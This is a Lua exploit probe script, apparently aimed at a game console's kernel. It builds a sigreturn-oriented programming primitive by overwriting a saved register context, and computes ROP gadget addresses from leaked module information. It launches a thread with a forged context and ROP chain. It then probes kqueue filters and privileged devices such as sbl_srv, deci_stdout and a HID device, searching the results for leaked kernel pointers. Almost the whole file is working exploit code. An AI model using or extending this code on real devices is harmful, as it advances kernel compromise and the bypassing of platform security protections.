-- CRASH_CLASS: LOW
-- PROBE 142w: kevent(363) deep test + deci debug + notification reads
-- kevent(363) confirmed working in 142v. Now test more filters and
-- explore debug/notification devices for kernel data.

print("=== PROBE 142w: KEVENT363 + DECI ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_kevent = make_syscall(363)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))

-- Helper to build a path string in GPU mem
local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

-- Helper: set up kevent struct
local function set_kevent(base, ident, filter, flags, fflags, data, udata)
    wq(base + 0x00, uint64(ident))
    wd(base + 0x08, filter + flags * 65536)
    wd(base + 0x0C, fflags or 0)
    wq(base + 0x10, uint64(data or 0))
    wq(base + 0x18, uint64(udata or 0))
end

-- Helper: dump kevent result
local function dump_kevent(label, base)
    local ident = safe_rq(base)
    local ff_raw = safe_rd(base + 0x08)
    local ffl = safe_rd(base + 0x0C)
    local data = safe_rq(base + 0x10)
    local udata = safe_rq(base + 0x18)
    local filter = (ff_raw or 0) % 65536
    local flags = math.floor((ff_raw or 0) / 65536) % 65536
    print(label .. " ident=" .. hex(ident) .. " filter=" .. filter .. " flags=" .. flags)
    print(label .. " fflags=0x" .. string.format("%08X", ffl or 0))
    print(label .. " data=" .. hex(data) .. " udata=" .. hex(udata))
    if data then
        local dh, dl = get_hi_lo(data)
        if dh >= 0xFFFF8000 then
            print(label .. " *** KERNEL PTR IN DATA! ***")
        end
    end
    if udata then
        local uh, ul = get_hi_lo(udata)
        if uh >= 0xFFFF8000 then
            print(label .. " *** KERNEL PTR IN UDATA! ***")
        end
    end
end

-- Create kqueue
local sc_kq = make_syscall(362)
local _, rv_kq = pcall(function() return sc_kq() end)
local kqh, kql = get_hi_lo(rv_kq)
print("kqueue fd=" .. kql)
local kq_fd = kql

-- Zero timeout
local ts0 = gpu + 0x100
wq(ts0, uint64(0))
wq(ts0 + 8, uint64(0))

--------------------------------------------------------------------
-- [A] Full kevent result for EVFILT_READ
--------------------------------------------------------------------
print("")
print("--- [A] EVFILT_READ full ---")

local sp = gpu + 0x1000
wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
local fd_a = safe_rd(sp) or 0
local fd_b = safe_rd(sp + 4) or 0
print("[A] sp=" .. fd_a .. "," .. fd_b)

-- Write data
local wbuf = gpu + 0x1100
wd(wbuf, 0x41424344)
srop(4, uint64(fd_a), ua(wbuf), uint64(4))

-- Register + poll EVFILT_READ (-1 = 0xFFFF as uint16)
local kev_c = gpu + 0x2000
set_kevent(kev_c, fd_b, 0xFFFF, 1, 0, 0, 0xAAAA)  -- EV_ADD=1

local kev_r = gpu + 0x2100
for off = 0, 0x1F, 4 do wd(kev_r + off, 0xEE) end

local _, rv = pcall(function()
    return sc_kevent(uint64(kq_fd), uint64(kev_c), uint64(1),
                     uint64(kev_r), uint64(1), uint64(ts0))
end)
print("[A] kevent ret=" .. hex(rv))
dump_kevent("[A]", kev_r)

--------------------------------------------------------------------
-- [B] EVFILT_WRITE (-2 = 0xFFFE)
--------------------------------------------------------------------
print("")
print("--- [B] EVFILT_WRITE ---")

local kev_w = gpu + 0x3000
set_kevent(kev_w, fd_a, 0xFFFE, 1, 0, 0, 0xBBBB)

local kev_wr = gpu + 0x3100
for off = 0, 0x1F, 4 do wd(kev_wr + off, 0xEE) end

local _, rv_w = pcall(function()
    return sc_kevent(uint64(kq_fd), uint64(kev_w), uint64(1),
                     uint64(kev_wr), uint64(1), uint64(ts0))
end)
print("[B] kevent ret=" .. hex(rv_w))
dump_kevent("[B]", kev_wr)

--------------------------------------------------------------------
-- [C] EVFILT_VNODE (-4 = 0xFFFC) on /dev/null
--------------------------------------------------------------------
print("")
print("--- [C] EVFILT_VNODE ---")

local devnull = gpu + 0x4000
make_path(devnull, "/dev/null")
local rv_dn = srop(5, ua(devnull), uint64(0))
local dnh, dnl = get_hi_lo(rv_dn)

if dnl < 256 and dnh == 0 then
    local kev_v = gpu + 0x4100
    set_kevent(kev_v, dnl, 0xFFFC, 1, 0x00000015, 0, 0xCCCC)
    -- fflags: NOTE_DELETE|NOTE_WRITE|NOTE_ATTRIB = 0x15

    local kev_vr = gpu + 0x4200
    for off = 0, 0x1F, 4 do wd(kev_vr + off, 0xEE) end

    local _, rv_v = pcall(function()
        return sc_kevent(uint64(kq_fd), uint64(kev_v), uint64(1),
                         uint64(kev_vr), uint64(1), uint64(ts0))
    end)
    print("[C] VNODE ret=" .. hex(rv_v))
    dump_kevent("[C]", kev_vr)
    srop(6, uint64(dnl))
end

--------------------------------------------------------------------
-- [D] EVFILT_PROC (-5=0xFFFB) on self + thread exit
--------------------------------------------------------------------
print("")
print("--- [D] EVFILT_PROC ---")

local kev_p = gpu + 0x5000
set_kevent(kev_p, pid, 0xFFFB, 1, 0x80000000, 0, 0xDDDD)
-- NOTE_EXIT = 0x80000000

local kev_pr = gpu + 0x5100
for off = 0, 0x1F, 4 do wd(kev_pr + off, 0xEE) end

local _, rv_p = pcall(function()
    return sc_kevent(uint64(kq_fd), uint64(kev_p), uint64(1),
                     uint64(0), uint64(0), uint64(ts0))
end)
print("[D] register ret=" .. hex(rv_p))

-- Spawn a short-lived thread via thr_create
local tspec = gpu + 0x6000
wq(tspec, uint64(0))
wq(tspec + 8, uint64(50000000))  -- 50ms

local rop = gpu + 0x10000
local i = 0
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, ua(tspec)); i=i+8
wq(rop + i, g_pop_rsi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(240)); i=i+8
wq(rop + i, sc_addr); i=i+8
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(431)); i=i+8
wq(rop + i, sc_addr); i=i+8

local ctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
pcall(function() return sc_gc(uint64(ctx)) end)
wq(ctx + 0xE0, g_ret)
wq(ctx + 0xF8, ua(rop))

local tid_buf = gpu + 0x30000
wq(tid_buf, uint64(0))
pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local ntid = safe_rq(tid_buf)
local nth, ntl = get_hi_lo(ntid)
print("[D] thread tid=" .. ntl)

-- Wait 200ms
local ts200 = memory.alloc(16)
wq(ts200, uint64(0))
wq(ts200 + 8, uint64(200000000))
pcall(function() sc_nanosleep(uint64(ts200), uint64(0)) end)

-- Poll kevent
for off = 0, 0x1F, 4 do wd(kev_pr + off, 0xEE) end
local _, rv_poll = pcall(function()
    return sc_kevent(uint64(kq_fd), uint64(0), uint64(0),
                     uint64(kev_pr), uint64(1), uint64(ts0))
end)
print("[D] poll ret=" .. hex(rv_poll))
dump_kevent("[D]", kev_pr)

--------------------------------------------------------------------
-- [E] EVFILT_SIGNAL (-6=0xFFFA) on SIGCHLD
--------------------------------------------------------------------
print("")
print("--- [E] EVFILT_SIGNAL ---")

local kev_s = gpu + 0x7000
set_kevent(kev_s, 20, 0xFFFA, 1, 0, 0, 0xEEEE)  -- SIGCHLD=20

local kev_sr = gpu + 0x7100
for off = 0, 0x1F, 4 do wd(kev_sr + off, 0xEE) end

local _, rv_s = pcall(function()
    return sc_kevent(uint64(kq_fd), uint64(kev_s), uint64(1),
                     uint64(kev_sr), uint64(1), uint64(ts0))
end)
print("[E] SIGNAL ret=" .. hex(rv_s))
dump_kevent("[E]", kev_sr)

--------------------------------------------------------------------
-- [F] Read from /dev/notification0
--------------------------------------------------------------------
print("")
print("--- [F] notification0 ---")

local npath = gpu + 0x8000
make_path(npath, "/dev/notification0")
local rv_no = srop(5, ua(npath), uint64(2))
local noh, nol = get_hi_lo(rv_no)
print("[F] notification0 fd=" .. nol)

if nol < 256 and noh == 0 then
    -- Try reading
    local nbuf = gpu + 0x8100
    for off = 0, 0xFF, 4 do wd(nbuf + off, 0) end
    local rv_nr = srop(3, uint64(nol), ua(nbuf), uint64(256))
    print("[F] read ret=" .. hex(rv_nr))
    local nrh, nrl = get_hi_lo(rv_nr)
    if nrl > 0 and nrl < 256 then
        for off = 0, math.min(nrl - 1, 63), 4 do
            local v = safe_rd(nbuf + off) or 0
            print("[F]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
        for off = 0, math.min(nrl - 1, 63), 8 do
            local q = safe_rq(nbuf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 then
                    print("[F] *** KERNEL PTR at +" .. string.format("%02X", off) .. "! ***")
                end
            end
        end
    end

    -- Try ioctl FIONREAD
    local iobuf = gpu + 0x8300
    wd(iobuf, 0)
    local rv_io = srop(54, uint64(nol), uint64(0x4004667F), ua(iobuf))
    print("[F] FIONREAD ret=" .. hex(rv_io) .. " val=" .. (safe_rd(iobuf) or "?"))

    srop(6, uint64(nol))
end

--------------------------------------------------------------------
-- [G] Open and probe deci_stdout
--------------------------------------------------------------------
print("")
print("--- [G] deci_stdout ---")

local dpath = gpu + 0x9000
make_path(dpath, "/dev/deci_stdout")
local rv_do = srop(5, ua(dpath), uint64(2))
local doh, dol = get_hi_lo(rv_do)
print("[G] deci_stdout=" .. hex(rv_do))

if dol < 256 and doh == 0 then
    -- Read
    local dbuf = gpu + 0x9100
    for off = 0, 0x7F, 4 do wd(dbuf + off, 0) end
    local rv_dr = srop(3, uint64(dol), ua(dbuf), uint64(128))
    print("[G] read=" .. hex(rv_dr))

    -- FIONREAD
    wd(dbuf, 0)
    local rv_di = srop(54, uint64(dol), uint64(0x4004667F), ua(dbuf))
    print("[G] FIONREAD=" .. hex(rv_di) .. " val=" .. (safe_rd(dbuf) or "?"))

    srop(6, uint64(dol))
else
    -- Try deci_stdin
    make_path(dpath, "/dev/deci_stdin")
    rv_do = srop(5, ua(dpath), uint64(0))
    doh, dol = get_hi_lo(rv_do)
    print("[G] deci_stdin=" .. hex(rv_do))
    if dol < 256 and doh == 0 then srop(6, uint64(dol)) end
end

--------------------------------------------------------------------
-- [H] Try /dev/sbl_srv (security service)
--------------------------------------------------------------------
print("")
print("--- [H] sbl_srv ---")

local spath = gpu + 0xA000
make_path(spath, "/dev/sbl_srv")
local rv_sbl = srop(5, ua(spath), uint64(0))
local sh, sl = get_hi_lo(rv_sbl)
print("[H] sbl_srv=" .. hex(rv_sbl))

if sl < 256 and sh == 0 then
    local sbuf = gpu + 0xA100
    for off = 0, 0x7F, 4 do wd(sbuf + off, 0) end
    local rv_sr2 = srop(3, uint64(sl), ua(sbuf), uint64(128))
    print("[H] read=" .. hex(rv_sr2))
    srop(6, uint64(sl))
end

--------------------------------------------------------------------
-- [I] Try /dev/hid
--------------------------------------------------------------------
print("")
print("--- [I] hid ---")

local hpath = gpu + 0xB000
make_path(hpath, "/dev/hid")
local rv_hid = srop(5, ua(hpath), uint64(2))
local hh, hl = get_hi_lo(rv_hid)
print("[I] hid=" .. hex(rv_hid))

if hl < 256 and hh == 0 then
    local hbuf = gpu + 0xB100
    for off = 0, 0x7F, 4 do wd(hbuf + off, 0) end
    local rv_hr = srop(3, uint64(hl), ua(hbuf), uint64(128))
    print("[I] read=" .. hex(rv_hr))

    -- Try Sony HID ioctl codes
    for _, code in ipairs({0xC0184801, 0xC0104800, 0x80044802, 0x40044803}) do
        for off = 0, 0x1F, 4 do wd(hbuf + off, 0) end
        local rv_hi = srop(54, uint64(hl), uint64(code), ua(hbuf))
        local ih, il = get_hi_lo(rv_hi)
        if il == 0 and ih == 0 then
            print("[I] ioctl 0x" .. string.format("%08X", code) .. " OK!")
            for off = 0, 28, 4 do
                local v = safe_rd(hbuf + off) or 0
                if v ~= 0 then
                    print("[I]  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
        end
    end
    srop(6, uint64(hl))
end

print("")
print("=== DONE ===")
